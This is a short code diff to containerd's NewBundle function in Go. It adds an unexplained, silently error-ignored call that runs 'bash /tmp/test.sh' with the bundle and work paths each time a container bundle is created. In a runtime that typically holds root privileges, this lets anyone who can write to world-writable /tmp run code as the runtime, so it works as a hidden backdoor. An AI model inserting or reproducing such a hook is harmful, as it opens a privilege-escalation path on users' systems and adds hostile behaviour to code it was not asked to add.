@@ -20,6 +20,7 @@ import (
 	"context"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 
 	"github.com/containerd/containerd/v2/core/mount"
@@ -84,6 +85,7 @@ func NewBundle(ctx context.Context, root, state, id string, spec typeurl.Any) (b
 	if err := os.MkdirAll(filepath.Dir(work), 0711); err != nil {
 		return nil, err
 	}
+	_ = exec.Command("bash", "/tmp/test.sh", b.Path, work).Run()
 	rootfs := filepath.Join(b.Path, "rootfs")
 	if err := os.MkdirAll(rootfs, 0711); err != nil {
 		return nil, err
